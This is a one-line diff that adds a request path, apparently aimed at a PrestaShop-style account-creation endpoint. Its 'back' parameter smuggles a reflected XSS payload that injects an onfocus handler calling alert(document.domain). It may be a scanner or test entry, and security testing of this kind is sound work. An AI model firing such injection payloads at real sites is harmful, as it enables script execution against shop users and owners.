@@ -1,0 +1,1 @@
+/?rand=1679996611398&controller=authentication&SubmitCreate=1&ajax=true&email_create=a&back=xss%20onfocus%3dalert(document.domain)%20autofocus%3d%20xss&token=6c62b773f1b284ac4743871b300a0c4d
